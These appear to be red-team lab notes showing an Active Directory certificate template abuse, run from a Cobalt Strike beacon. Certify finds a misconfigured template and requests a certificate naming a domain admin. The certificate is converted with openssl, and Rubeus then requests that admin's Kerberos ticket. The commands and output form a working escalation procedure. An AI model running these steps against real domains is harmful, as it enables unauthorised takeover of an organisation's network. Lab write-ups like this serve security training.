```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```
![[customuser.png]]
This configuration allows any domain user to request a certificate for any other domain user (including a domain admin) and use it for authentication.  Request a certificate for nlamb.
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

[*] Action: Request a Certificates
[*] Current user context    : DEV\bfarmer
[*] No subject name specified, using current context as subject.

[*] Template                : CustomUser
[*] Subject                 : CN=Bob Farmer, CN=Users, DC=dev, DC=cyberbotic, DC=io
[*] AltName                 : nlamb

[*] Certificate Authority   : dc-2.dev.cyberbotic.io\sub-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 11

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
[...]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:05.4521116
```
Copy the whole certificate (both the private key and certificate) and save it to `cert.pem` on Ubuntu WSL.  Then use the provided `openssl` command to convert it to pfx format.
```
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password: pass123
Verifying - Enter Export Password: pass123
```
Convert `cert.pfx` into a base64 encoded string so it can be used with Rubeus
```
ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0
MIIM7w[...]ECAggA
```
Ask for a tgt of a domain admin
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
```
